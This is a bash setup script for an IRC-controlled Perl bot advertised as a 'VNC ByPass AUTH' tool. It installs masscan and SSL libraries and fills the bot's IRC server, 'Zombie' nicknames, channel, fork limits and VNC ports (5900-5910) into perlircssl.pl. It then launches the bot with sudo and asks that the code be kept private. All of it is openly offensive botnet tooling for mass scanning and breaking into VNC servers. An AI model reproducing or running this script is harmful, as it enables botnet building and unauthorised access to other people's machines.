 	#!/bin/bash
 	clear;
 	echo "Perl VNC ByPass AUTH IRC Bot with SSL";
 	echo "Made by independent";
 	echo "Please keep this code PRIVATE!!!";
 	read -p "Install required packages? Y or LEAVE BLANK + ENTER" choice
 	case $choice in
 	Y) sudo apt update && sudo apt install perl pkg-perl-tools libssl-dev masscan -y && sudo cpan -fi Net::SSLeay IO::Socket::SSL Time::HiRes Mojolicious Mojo::IRC;;  
 	esac
 	cp ./perlircssl.pl perlircssl.pl.bak;
 	if read -p "IRC server:port? " name; then
 	  sed -i~ -e "s/#defineserverhere/server => \'${name}\',/g" perlircssl.pl
 	fi
 	read -p "Port has SSL enabled? (1/0)" ssl
 		case $ssl in
 	 1) sed -i~ -e "s/#definesslhere/\$irc->tls({insecure => ${ssl}});/g" perlircssl.pl;;
 	 *) echo "SSL is disabled";; 
 	esac
 	if read -p "Bot Nickname Base? (Zombie)" nick; then
 	  sed -i~ -e "s/#definenickhere/nick => \'$nick\'.int(rand(99999)),/g" perlircssl.pl
 	fi
 	if read -p "Channel to join when connected? (#Zombies)" ch4n; then
 	  sed -i~ -e "s/#definechanhere/my \$channel = \'$ch4n\';/g" perlircssl.pl
 	  sed -i~ -e "s/#definenoticechanhere/my \$noticechan = \'@$ch4n\';/g" perlircssl.pl
 	fi
 	if read -p "Fork timeout in seconds? (60)" timeout; then
 	  sed -i~ -e "s/#definetimeouthere/my \$forktimeout = "$timeout";/g" perlircssl.pl
 	fi
 	if read -p "Maximum number of forks? (2000)" m4xfork; then
 	  sed -i~ -e "s/#defineforkshere/my \$maxforks = "$m4xfork";/g" perlircssl.pl
 	fi
 	if read -p "Define the ports numbers to scan (5900 5901 5902 5903 5904 5905 5906 5907 5908 5909 5910)" ports; then
 	  sed -i~ -e "s|#defineportshere|my @VNC_PORTS = qw/\'$ports\'/;|g" perlircssl.pl
 	fi
 	read -p "In order for bot to work you need to be operator in the channel, it also must be registered with services and YOU MUST autovoice your bots else you will not get any output in the server, ARE YOU READY TO LAUNCH THE PERL SCRIPT??? (Y or LEAVE BLANK + ENTER" choices
 	case $choices in
 	Y) sudo perl perlircssl.pl &;;  
 	esac